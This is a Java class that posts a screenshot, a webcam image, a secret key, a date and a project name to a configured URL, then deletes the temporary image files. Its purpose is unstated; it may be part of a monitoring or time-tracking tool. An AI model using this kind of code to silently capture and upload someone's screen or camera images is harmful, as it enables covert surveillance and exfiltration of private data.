import java.io.File;
import java.nio.file.Files;
import java.nio.file.FileSystems;
import java.util.Calendar;
import java.text.SimpleDateFormat;
import org.apache.http.HttpEntity;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.client.CloseableHttpClient;

public class PostCreator {
	private String url;
	private String proj_name;
	private String screen_img = Constants.tempscreen;
	private String camera_img = Constants.tempcamera;

	public PostCreator(String url, String name) {
		System.out.println("[*] Loading variables");
		this.url = url;
		this.proj_name = name;
	}

	private String now() {
		Calendar cal = Calendar.getInstance();
		SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		return sdf.format(cal.getTime());
	}

	public void send() {
		System.out.println("[*] Preparing request");
		CloseableHttpClient http_client = new DefaultHttpClient();
		try {
			HttpPost http_post = new HttpPost(this.url);
			MultipartEntityBuilder mpe = MultipartEntityBuilder.create();

			File screen_file = new File(this.screen_img);
			File camera_file = new File(this.camera_img);
			StringBody secret_key = new StringBody(Constants.secret_key);
			StringBody date = new StringBody(this.now());
			StringBody project_name = new StringBody(this.proj_name);

			mpe.addPart("secret_key",secret_key);
			mpe.addPart("date",date);
			mpe.addPart("project_name",project_name);
			mpe.addBinaryBody("screen_img",screen_file);
			mpe.addBinaryBody("camera_img",camera_file);

			HttpEntity request = mpe.build();
			http_post.setEntity(request);
			http_client.execute(http_post);
		} catch (Exception e2) {} finally {
			try { http_client.close(); } catch (Exception e3) {}
		}

		System.out.println("[+] Request sent");
	}

	public void cleanup() {
		try {
			Files.delete(FileSystems.getDefault().getPath(this.screen_img));
			Files.delete(FileSystems.getDefault().getPath(this.camera_img));
		} catch (Exception e) {
			System.out.println("[-] Failed to delete temporary files");
		}
	}
}